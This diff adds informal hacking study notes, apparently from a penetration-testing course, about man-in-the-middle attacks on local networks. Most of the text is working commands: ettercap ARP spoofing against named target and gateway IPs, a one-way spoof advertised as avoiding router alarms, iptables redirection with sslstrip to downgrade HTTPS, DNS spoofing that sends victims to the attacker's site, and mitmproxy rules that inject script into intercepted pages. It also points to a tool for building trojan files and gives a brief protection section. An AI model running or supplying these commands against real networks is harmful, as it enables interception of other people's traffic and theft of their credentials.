@@ -1,0 +1,113 @@
+#Ettercap
+Tool for the mitm attacks
+leaf /etc/ettercap/etter.conf		//opening the conf file for editing
+edit the ip tables line and remove the comment from the two lines
+and also at the start only change the "euid" to 0 for no errors.
+
+We can use help options 				//ettercap --help
+we can also have the user interface		//ettercap -Tq
+eg--ettercap -Tq -M arp:remote /192.168.1.1(gateway)//	/192.168.1.15(target)//
+
+
+#Not triggering any alarm in the router---
+To not trigger the alarm in the router we can use one way arp spoof so that we just tell the victim that we are router and we will redirect for you and then we send the request to the real router and then it will send the response to both of the host and thus we will be able to capture the details and not triggering any alarm
+ettercap -Tq -M arp:oneway -S /192.168.1.9(target)//	/192.168.1.1(router)//
+
+
+
+
+#Downgrading https to http-(sslstrip)
+but one problem is there that it uses port 10000, so we need to redirect traffic from 80 to 10000 using iptables
+
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+sslstrip														//it will start running
+ettercap -Tq -M arp:remote -S /192.168.1.1(gateway)//	/192.168.1.15(target)//
+(-S to tell ettercap to do not use anything for downgrading as sslstrip is working)
+iptables -t nat --flush										//flushing the iptables entry at the end	
+
+We can use ettercap plugins like "autoadd"	for adding the hosts even if we pass the command and we are in the mitm
+We can also use plugin like "dns_spoof" but we need to edit the etter.dns from /etc/ettercap/etter.dns and then pass the dns entries.
+Then whenever the user opens that particular website, then it will be redirected to our website hosted on the server
+
+
+
+
+
+
+
+
+
+
+
+#Man in the Middle Proxy						//mitmproxy(github)
+Use to intercept,analyse,modify and replay packet flows			//it can't be done by ettercap
+Supports a no. of proxy modes
+TLS cert generation
+
+Uses two operation modes---
+Explicit--user connects directly to the proxy
+Transparent--data is redirected to the proxy
+
+./mitmweb							//runs explicit as default modes
+and also make changes to the proxy settings in the firefox and set the proxy to 127.0.0.1:8080
+Now we can have the mitmweb running on the web and then we can filter the search based on the languages
+Intercept any url	-----			/*	(intecept get and post request)
+
+
+
+
+#Now using transparent mode--
+run the ettercap for arp spoof
+then redirect all the traffic from port 80 to 8080 where the mitmproxy will be running
+and then run the mitmproxy
+./mitmweb --transparent
+and then intercept the things you want and do not forget to flush the ip tables
+
+
+We can also replace using regex so we need to use command line to replace
+./mitmdump --transparent --replace :~bs:"</body>":"<script>alert(1)</script></body>" 			and this same as mitmweb
+
+
+
+##Mitmproxy scripts---use library mitmproxy (python) to make the script
+We can't use "sslstrip" proxy with the mitmproxy as it can't hold for the transparent proxy
+But we can include the script of sslstrip which is available with the mitmproxy(github)
+
+
+
+
+
+
+#Trojans--It is a file that looks and functions as a normal file(image,pdf,song)
+When executed--
+Opens the normal file and the backdoor runs at background
+
+>>Trojan factory(github)
+and the other scripts are also available
+
+
+
+
+
+#Protection against the attacks---
+HTTPS everywhere 				//addon for firefox
+xARP tool to detect ARP spoofing
+
+
+
+12. Man in the Middle Attack
+
+12.1 Bettercap tool
+apt-get install bettercap
+
+12.2 Ettercap
+ettercap -G 				//g for graphical   (tool already installed in Kali Linux)
+
+
+
+
+
+
+
+
+#ends
